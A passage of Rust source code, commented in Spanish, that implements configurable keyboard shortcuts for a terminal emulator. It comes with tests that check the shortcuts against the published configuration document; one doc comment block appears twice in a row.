}

/// Qué acorde hace cada cosa.
///
/// **Es la única fuente de qué acorde pertenece a la aplicación**, y ésa es la razón de que exista. Antes
/// eran **dos listas paralelas** —una decía si el acorde era nuestro y otra qué hacía— y desalinearlas ya
/// dejó una flecha «en la cola sin llegar nunca al programa», con su comentario escrito en el sitio. Con
/// once acordes configurables ese riesgo se multiplica por once.
///
/// **Lo que NO unifica es la condición de cada acción**: que crear no valga repetido, o que cambiar de
/// pestaña solo sea nuestro con más de una abierta, sigue colgando de la acción que lo necesita. Son
/// reales y tienen que sobrevivir a que el acorde cambie.
#[derive(Debug, Clone)]
pub struct Keymap {
    /// Pares acorde → acción. **Un vector y no un mapa**: son once como mucho, y recorrer once parejas de
    /// booleanos y un entero es más rápido que resumir el acorde a un número. Se busca una vez por evento
    /// de teclado, que es el camino más caliente del proyecto.
    table: Vec<(Chord, Action)>,
}

impl Default for Keymap {
    /// Los de fábrica: los mismos trece de siempre menos pegar, que no llega como tecla.
    fn default() -> Self {
        use eframe::egui::Key;
        let with_the_chord = |key| Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key,
        };
        // **El historial va con `Mayúsculas` a secas, y no es una excepción caprichosa.** Sin ella,
        // `RePág` es del programa —un paginador la usa— y quitársela sería romper `less` dentro de esta
        // ventana.
        let scrollback = |key| Chord {
            ctrl: false,
            shift: true,
            alt: false,
            key,
        };
        Self {
            table: vec![
                (with_the_chord(Key::D), Action::SplitRight),
                (with_the_chord(Key::B), Action::SplitDown),
                (with_the_chord(Key::X), Action::ClosePane),
                (with_the_chord(Key::T), Action::NewTab),
                (with_the_chord(Key::W), Action::CloseTab),
                (with_the_chord(Key::ArrowLeft), Action::PreviousTab),
                (with_the_chord(Key::ArrowRight), Action::NextTab),
                (scrollback(Key::PageUp), Action::ScrollPageUp),
                (scrollback(Key::PageDown), Action::ScrollPageDown),
                (scrollback(Key::Home), Action::ScrollToTop),
                (scrollback(Key::End), Action::ScrollToBottom),
            ],
        }
    }
}

impl Keymap {
    /// Qué acción hace ese acorde, si alguna.
    ///
    /// **Un acorde que no está en la tabla NO es de la aplicación**, y sus bytes bajan al programa de
    /// dentro. Es la mitad que hace que desatar un atajo sirva de algo.
    pub fn action_for(&self, chord: Chord) -> Option<Action> {
        self.table
            .iter()
            .find(|(chord_of, _)| *chord_of == chord)
            .map(|(_, action)| *action)
    }

    /// Le cambia el acorde a una acción. `None` la desata.
    ///
    /// Devuelve la acción que se queda **sin** su acorde por el choque, si alguna: dos acciones no pueden
    /// compartir acorde, porque entonces pulsar no sabría cuál de las dos hacer.
    pub fn bind(&mut self, action: Action, chord: Option<Chord>) -> Option<Action> {
        self.table.retain(|(_, chord_of)| *chord_of != action);
        let chord = chord?;
        // **Gana la última leída, y se dice cuál perdió.** Es lo que hace que pegar un juego de atajos
        // encima de otro haga lo que se espera; callarlo dejaría a alguien media hora cambiando una línea
        // que otra de más abajo está pisando.
        let displaced = self
            .table
            .iter()
            .find(|(chord_of, _)| *chord_of == chord)
            .map(|(_, action)| *action);
        self.table.retain(|(chord_of, _)| *chord_of != chord);
        self.table.push((chord, action));
        displaced
    }
}

#[cfg(test)]
mod keymap_tests {
    use super::*;
    use eframe::egui::Key;

    #[test]
    fn el_documento_publica_exactamente_los_atajos_que_el_codigo_tiene() {
        // **Es el revisor que más rinde en este proyecto, escrito como prueba.** Contrastar el documento
        // publicado contra la fuente encontró nueve desajustes en un solo PR, ninguno visible en el diff.
        // Aquí ya cazó dos: el documento prometía «shift+prior», que el código rechazaba, y publicaba las
        // flechas con su símbolo, que tampoco entendía.
        //
        // **La tabla de abajo se copia del documento a mano y a propósito.** Generarla del código mediría
        // que el código es consistente consigo mismo; lo que hay que atar es que lo publicado sea verdad.
        let published = [
            ("split-right", "ctrl+shift+d", Action::SplitRight),
            ("split-down", "ctrl+shift+b", Action::SplitDown),
            ("close-pane", "ctrl+shift+x", Action::ClosePane),
            ("new-tab", "ctrl+shift+t", Action::NewTab),
            ("close-tab", "ctrl+shift+w", Action::CloseTab),
            ("previous-tab", "ctrl+shift+←", Action::PreviousTab),
            ("next-tab", "ctrl+shift+→", Action::NextTab),
            ("scroll-page-up", "shift+pageup", Action::ScrollPageUp),
            ("scroll-page-down", "shift+pagedown", Action::ScrollPageDown),
            ("scroll-to-top", "shift+home", Action::ScrollToTop),
            ("scroll-to-bottom", "shift+end", Action::ScrollToBottom),
        ];
        assert_eq!(
            published.len(),
            ALL.len(),
            "el documento publica {} atajos y el código tiene {}",
            published.len(),
            ALL.len()
        );

        let keymap = Keymap::default();
        for (name, written, action) in published {
            assert_eq!(
                Action::from_written(name),
                Some(action),
                "el documento publica el nombre «{name}» y el código no lo entiende"
            );
            let chord = Chord::from_written(written).unwrap_or_else(|| {
                panic!("el documento publica «{written}» y el código no lo entiende")
            });
            assert_eq!(
                keymap.action_for(chord),
                Some(action),
                "el documento dice que «{name}» es «{written}» de fábrica, y no lo es"
            );
        }
    }

    #[test]
    fn los_once_de_fabrica_son_los_mismos_de_siempre() {
        // **Es lo que hace que este cambio no rompa a nadie.** Los acordes de fábrica son los que el
        // terminal tenía antes de que se pudieran configurar, y una tabla que naciera con otros los
        // cambiaría de golpe a todo el mundo sin que nadie lo pidiera.
        let keymap = Keymap::default();
        let with_the_chord = |key| Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key,
        };
        let scrollback = |key| Chord {
            ctrl: false,
            shift: true,
            alt: false,
            key,
        };

        let factory = [
            (with_the_chord(Key::D), Action::SplitRight),
            (with_the_chord(Key::B), Action::SplitDown),
            (with_the_chord(Key::X), Action::ClosePane),
            (with_the_chord(Key::T), Action::NewTab),
            (with_the_chord(Key::W), Action::CloseTab),
            (with_the_chord(Key::ArrowLeft), Action::PreviousTab),
            (with_the_chord(Key::ArrowRight), Action::NextTab),
            (scrollback(Key::PageUp), Action::ScrollPageUp),
            (scrollback(Key::PageDown), Action::ScrollPageDown),
            (scrollback(Key::Home), Action::ScrollToTop),
            (scrollback(Key::End), Action::ScrollToBottom),
        ];

        for (chord, expected) in factory {
            assert_eq!(
                keymap.action_for(chord),
                Some(expected),
                "el acorde de fábrica de «{}» cambió",
                expected.as_written()
            );
        }
        // **Contra los pares que se acaban de ejercer, no contra un número escrito aparte.** Un literal
        // aquí se queda viejo en cuanto la lista cambia, y lo que hay que atar es que **ninguna acción se
        // quede sin acorde de fábrica**: una acción nueva sin par en la lista de arriba no se dispararía
        // nunca y nada lo diría.
        assert_eq!(
            ALL.len(),
            factory.len(),
            "hay acciones sin acorde de fábrica, o acordes de fábrica de acciones que ya no existen"
        );
    }

    #[test]
    fn un_acorde_que_nadie_reclama_no_es_de_la_aplicacion() {
        // **Es la mitad que hace que desatar un atajo sirva de algo**: lo que no está en la tabla baja al
        // programa de dentro. Sin ella, `none` dejaría el acorde en un limbo donde ni hace nada ni
        // llega a `vim`.
        let keymap = Keymap::default();
        assert_eq!(
            keymap.action_for(Chord {
                ctrl: true,
                shift: true,
                alt: false,
                key: Key::Z
            }),
            None,
            "un acorde que nadie configuró salió como de la aplicación"
        );
    }

    #[test]
    fn desatar_una_accion_le_devuelve_el_acorde_al_programa() {
        let mut keymap = Keymap::default();
        let its_own = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::D,
        };
        assert_eq!(keymap.action_for(its_own), Some(Action::SplitRight));

        assert_eq!(
            keymap.bind(Action::SplitRight, None),
            None,
            "desatar no pisa a nadie"
        );
        assert_eq!(
            keymap.action_for(its_own),
            None,
            "el acorde desatado sigue siendo de la aplicación, así que no llega al programa"
        );
    }

    #[test]
    fn cambiar_un_acorde_deja_libre_el_viejo() {
        // **Las dos mitades del criterio**: el nuevo hace lo suyo, y el viejo deja de hacerlo. Sin la
        // segunda, reasignar sumaría acordes en vez de moverlos.
        let mut keymap = Keymap::default();
        let old = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::D,
        };
        let new = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::E,
        };

        keymap.bind(Action::SplitRight, Some(new));

        assert_eq!(
            keymap.action_for(new),
            Some(Action::SplitRight),
            "el acorde nuevo no hace nada"
        );
        assert_eq!(
            keymap.action_for(old),
            None,
            "el acorde viejo sigue partiendo: reasignar sumó en vez de mover, y el programa nunca lo recibe"
        );
    }

    #[test]
    fn dos_acciones_no_se_quedan_con_el_mismo_acorde_y_se_dice_cual_pierde() {
        // **Gana la última, y se dice cuál perdió.** Callarlo dejaría a alguien media hora cambiando una
        // línea que otra de más abajo está pisando; y dejar las dos con el mismo acorde haría que pulsar
        // no supiera cuál de las dos hacer.
        let mut keymap = Keymap::default();
        let of_closing = Chord {
            ctrl: true,
            shift: true,
            alt: false,
            key: Key::X,
        };

        let displaced = keymap.bind(Action::SplitRight, Some(of_closing));

        assert_eq!(
            displaced,
            Some(Action::ClosePane),
            "no se dijo qué acción se quedaba sin acorde"
        );
        assert_eq!(
            keymap.action_for(of_closing),
            Some(Action::SplitRight),
            "no ganó la última"
        );
    }

    #[test]
    fn un_acorde_se_escribe_como_lo_escribe_la_gente() {
        for text in [
            "ctrl+shift+e",
            "Ctrl+Shift+E",
            "SHIFT+ctrl+e",
            "  ctrl + shift + e  ",
        ] {
            assert_eq!(
                Chord::from_written(text),
                Some(Chord {
                    ctrl: true,
                    shift: true,
                    alt: false,
                    key: Key::E
                }),
                "«{text}» no se entendió"
            );
        }
        // **Y la tecla de mando ya solo se escribe en inglés.** D27 mete en el hito lo que ve quien usa el
        // terminal y decide no dejar tabla de alias; sin esta afirmación, una rama que siguiera admitiendo
        // la grafía vieja no la nota nadie y devuelve por la puerta de atrás la deuda que la decisión se
        // ahorró.
        for text in ["ctrl+mayusculas+e", "ctrl+mayúsculas+e", "ctrl+mayus+e"] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» se sigue aceptando: hay tabla de alias donde D27 dice que no la hay"
            );
        }
    }

    #[test]
    fn las_teclas_se_escriben_como_las_escribe_la_gente() {
        // **`Key::from_name` distingue mayúsculas y quien teclea un fichero no.** Comprobado ejecutándolo:
        // `F4` sí y `f4` no, `PageUp` sí y `pageup` no. Sin esto, la mitad de los acordes que alguien
        // escribiría a mano se rechazarían sin que se entienda por qué.
        for (text, expected) in [
            ("ctrl+f4", Key::F4),
            ("ctrl+F4", Key::F4),
            ("shift+pageup", Key::PageUp),
            ("shift+home", Key::Home),
            ("ctrl+space", Key::Space),
            ("ctrl+delete", Key::Delete),
        ] {
            assert_eq!(
                Chord::from_written(text).map(|a| a.key),
                Some(expected),
                "«{text}» no se entendió"
            );
        }

        // **Y los alias.** `prior` y `next` son como los llaman los terminales de siempre — y como los
        // llamaba el documento de este proyecto antes de que nadie comprobara que no existen. Las flechas
        // se escriben también con la flecha, que es como las publica el documento y no tiene idioma.
        for (text, expected) in [
            ("shift+prior", Key::PageUp),
            ("shift+next", Key::PageDown),
            ("shift+pgup", Key::PageUp),
            ("shift+pgdn", Key::PageDown),
            ("ctrl+esc", Key::Escape),
            ("ctrl+left", Key::ArrowLeft),
            ("ctrl+up", Key::ArrowUp),
            // **Las cuatro flechas por su símbolo, y las cuatro porque son el único alias de este
            // `match` que el respaldo NO puede resolver**: egui las llama `Up`, `Down`, `Left` y
            // `Right`, así que sus nombres se resuelven solos y el dibujo no. Dos de ellas no las
            // ejercía nada mientras el documento las publicaba.
            ("ctrl+←", Key::ArrowLeft),
            ("ctrl+→", Key::ArrowRight),
            ("ctrl+↑", Key::ArrowUp),
            ("ctrl+↓", Key::ArrowDown),
        ] {
            assert_eq!(
                Chord::from_written(text).map(|a| a.key),
                Some(expected),
                "«{text}» no se entendió"
            );
        }

        // **Y los nombres de tecla en español ya no valen**, por lo mismo que la tecla de mando de arriba:
        // sin afirmarlo, la mitad de una tabla de alias que D27 prohíbe puede sobrevivir sin que nada caiga.
        for text in [
            "shift+repág",
            "ctrl+supr",
            "shift+inicio",
            "shift+fin",
            "ctrl+izquierda",
            "ctrl+espacio",
        ] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» se sigue aceptando: hay tabla de alias donde D27 dice que no la hay"
            );
        }
    }

    #[test]
    fn los_acordes_de_copiar_y_pegar_no_se_pueden_reclamar() {
        // **Aceptarlos sería prometer algo que no ocurre**: el escritorio los resuelve antes de que
        // lleguen, así que esos acordes no aparecen nunca como teclas. Quien los escribiera vería un atajo
        // que no hace nada y no tendría forma de saber por qué.
        for text in [
            "ctrl+shift+v",
            "ctrl+v",
            "ctrl+alt+v",
            "ctrl+shift+c",
            "ctrl+c",
            "ctrl+alt+c",
        ] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» se aceptó, y no llegaría nunca"
            );
        }
        // Pero sin Ctrl son teclas como otra cualquiera.
        for text in ["shift+v", "shift+c", "alt+c"] {
            assert!(
                Chord::from_written(text).is_some(),
                "«{text}» se rechazó, y ése sí llega"
            );
        }
    }

    #[test]
    fn un_acorde_sin_tecla_de_mando_no_se_admite() {
        // **Admitirlo dejaría que quien configura se quite una letra de escribir** sin que nada se lo
        // advierta: `key.copy = c` haría que la `c` no llegara nunca al programa.
        for text in ["c", "e", "prior"] {
            assert_eq!(
                Chord::from_written(text),
                None,
                "«{text}» se aceptó como acorde, y se llevaría esa tecla por delante"
            );
        }
        // Y lo que no es ninguna tecla conocida tampoco.
        for text in ["ctrl+shift+", "ctrl+shift+noexiste", "ctrl+shift+e+f", ""] {
            assert_eq!(Chord::from_written(text), None, "«{text}» se aceptó");
        }
    }

    #[test]
    fn las_acciones_se_escriben_como_las_publica_el_documento() {
        for action in ALL {
            let written = action.as_written();
            assert_eq!(Action::from_written(written), Some(action));
        }
        assert_eq!(
            Action::from_written("paste"),
            None,
            "pegar no es un atajo reasignable"
        );
        assert_eq!(Action::from_written("made-up"), None);

        // **Y los nombres viejos ya no valen**, que es la mitad que D27 decide y nada más ataba: sin esto,
        // dejar la lista vieja al lado de la nueva no lo nota ninguna prueba.
        for old in [
            "partir-al-lado",
            "cerrar-division",
            "pestaña-nueva",
            "pestana-nueva",
        ] {
            assert_eq!(
                Action::from_written(old),
                None,
                "«{old}» se sigue aceptando: hay tabla de alias donde D27 dice que no la hay"
            );
        }
    }

    /// **Los once nombres viven dos veces**: aquí y en el documento de configuración, escritos a mano
    /// en los dos sitios. Nada los comparaba, así que renombrar uno dejaba publicado un fichero de
    /// configuración con una clave que la aplicación rechaza — y ninguna prueba se enteraba.
    ///
    /// Se lee el documento en tiempo de compilación en vez de repetir la lista: una prueba que
    /// copiase los once nombres se arregla sola cuando alguien los traduce en los dos lados y se
    /// olvida del documento, que es exactamente el fallo que viene a cazar.
    ///
    /// **Y es la otra dirección de [`el_documento_publica_exactamente_los_atajos_que_el_codigo_tiene`],
    /// no un duplicado suyo.** Aquélla copia la tabla del documento a mano **a propósito** —lo dice su
    /// comentario— y con eso caza que **el código** se desvíe de lo publicado. Pero al ser una copia,
    /// un cambio en el documento sin tocar el código la deja verde: medido. Ésta lee el documento de
    /// verdad, así que caza esa mitad. Hacen falta las dos, y por eso ninguna sobra.
    /// **Los once nombres viven dos veces**: aquí y en el documento de configuración, escritos a mano
    /// en los dos sitios. Nada los comparaba, así que renombrar uno dejaba publicado un fichero de
    /// configuración con una clave que la aplicación rechaza — y ninguna prueba se enteraba.
    ///
    /// Se lee el documento en tiempo de compilación en vez de repetir la lista: una prueba que
    /// copiase los once nombres se arregla sola cuando alguien los traduce en los dos lados y se
    /// olvida del documento, que es exactamente el fallo que viene a cazar.
    ///
    /// **Y es la otra dirección de [`el_documento_publica_exactamente_los_atajos_que_el_codigo_tiene`],
    /// no un duplicado suyo.** Aquélla copia la tabla del documento a mano **a propósito** —lo dice su
    /// comentario— y con eso caza que **el código** se desvíe de lo publicado. Pero al ser una copia,
    /// un cambio en el documento sin tocar el código la deja verde: medido. Ésta lee el documento de
    /// verdad, así que caza esa mitad. Hacen falta las dos, y por eso ninguna sobra.
    /// **Cada acorde que el documento publica se interpreta de verdad.**
    ///
    /// Es el hueco que quedaba entre las otras dos guardas: aquéllas atan los once **nombres** y la tabla
    /// de claves, y dejan fuera la prosa —las grafías de tecla, la lista de teclas de mando y la columna
    /// «De fábrica»—, que es de donde salió el desajuste histórico de este proyecto: el documento prometía
    /// `shift+prior` y el código lo rechazaba, y no lo vio nadie hasta que una persona contrastó los dos
    /// ficheros a mano. Ese acorde es uno de los catorce que esta prueba recorre.
    ///
    /// **Un acorde se reconoce por su forma y no por dónde está**, así que esta guarda no ancla en ninguna
    /// frase. Eso importa porque la prosa de este documento está en español y **la traduce otra entrega**:
    /// una guarda que enganchara por el texto moriría ese día sin que nadie lo notara.
    #[test]
    fn cada_acorde_que_el_documento_publica_lo_entiende_el_codigo() {
        const DOCUMENT: &str = include_str!("../../../docs/08-configuracion.md");

        // **Los bloques de ejemplo se quitan antes de partir por las comillas invertidas**, y no por
        // gusto: sus vallas son tres comillas invertidas, así que partir sobre el documento entero
        // devuelve el cuerpo del bloque como si fuera un token. Los ejemplos ya tienen su propia guarda,
        // que los pasa por el intérprete del fichero.
        let mut inside = false;
        let prose: String = DOCUMENT
            .lines()
            .filter(|line| {
                if line.starts_with("```") {
                    inside = !inside;
                    return false;
                }
                !inside
            })
            .collect::<Vec<_>>()
            .join("\n");
        let published: Vec<&str> = prose
            .split('`')
            .skip(1)
            .step_by(2)
            // Un acorde es un `+` **entre dos partes**, y esa forma es la que lo distingue del `+` a
            // secas con el que el documento explica cómo se escribe uno.
            .filter(|token| token.contains('+') && token.split('+').all(|part| !part.is_empty()))
            // **Y la caja distingue las dos cosas que el documento escribe con `+`.** Lo que va en
            // minúsculas es una línea del fichero —los ejemplos y la columna «De fábrica»—; lo que lleva
            // mayúscula nombra **la tecla que se pulsa** (`Ctrl+Mayúsculas+C`), que es prosa y no
            // sintaxis. Los dos que el documento declara imposibles de asignar caen en el segundo grupo,
            // y que se rechazan ya lo afirma [`los_acordes_de_copiar_y_pegar_no_se_pueden_reclamar`].
            .filter(|token| **token == token.to_lowercase())
            .collect();
        // Sin suelo, un documento que dejara de escribir acordes entre comillas invertidas dejaría esta
        // prueba pasando por estar vacía. Hoy publica catorce.
        assert_eq!(
            published.len(),
            14,
            "el documento publica {} acordes en minúsculas: o cambió de forma, o este recorrido dejó \
             de encontrarlos y la prueba no está mirando nada — {published:?}",
            published.len()
        );

        for chord in published {
            assert!(
                Chord::from_written(chord).is_some(),
                "el documento publica el acorde «{chord}» y el código lo rechaza: quien lo copie \
                 escribiría una línea que no hace nada"
            );
        }
    }

    #[test]
    fn cada_accion_esta_publicada_en_el_documento_de_configuracion() {
        const DOCUMENT: &str = include_str!("../../../docs/08-configuracion.md");

        let unpublished: Vec<&str> = ALL
            .iter()
            .map(|action| action.as_written())
            .filter(|name| !DOCUMENT.contains(&format!("`{name}`")))
            .collect();

        assert!(
            unpublished.is_empty(),
            "estas acciones se pueden configurar y el documento no las publica: {unpublished:?}. \
             Quien lea el documento no sabría que existen, y quien lo siga escribiría una clave que \
             la aplicación rechaza"
        );
    }
}
